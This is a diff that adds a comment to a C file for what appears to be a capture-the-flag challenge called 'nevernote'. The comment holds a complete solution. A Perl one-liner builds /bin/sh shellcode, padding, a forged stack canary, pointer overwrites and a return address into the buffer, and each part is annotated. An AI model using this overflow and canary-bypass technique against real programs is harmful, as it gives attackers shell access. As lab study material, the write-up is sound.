@@ -1,3 +1,24 @@
+/*
+** Solution
+** pico4180@shell:/home/nevernote$ (echo "Remi"; echo "add_note"; perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45" . "A"x467 . "\xeb\x16\x5b\x31" . "\x50\xc0\x04\x08" . "A"x12 . "Z"x4 . "\x24\xd4\xff\xff" . "\x50\xc0\x04\x08" . "\x00"' ; cat) |./nevernote
+**
+** This one is a little tricky.
+** echo "Remi"; 
+** echo "add_note"; 
+** perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x45\x45\x45\x45" 
+** . "A"x467            # The buffer "temporary.buff" is 512 bytes long. The first 45 bytes are the shellcode. It is then fills up with 467 bytes of garbage (45 + 467 = 512) 
+** . "\xeb\x16\x5b\x31" # We override the canary value "temporary.canary.can", with the 4st byte of the shellcode
+** . "\x50\xc0\x04\x08" # We override the verify pointer "temporary.canary.verfiy", with the address of the new_note variable, allocated in add_note
+** . "A"x12             # There is 12 bytes of padding between the verify pointer and the top of the stack
+** . "Z"x4              # We override the epb pointer
+** . "\x24\xd4\xff\xff" # We override the eip pointer, so that it points to the buffer "temporary.buff", which contains our shellcode :)
+** . "\x50\xc0\x04\x08" # We restore the dest pointer (the copy of the he new_note pointer), otherwise it will by overrided with the NULL byte from strncpy
+** . "\x00"'; 
+** cat) 
+** |./nevernote
+** 
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
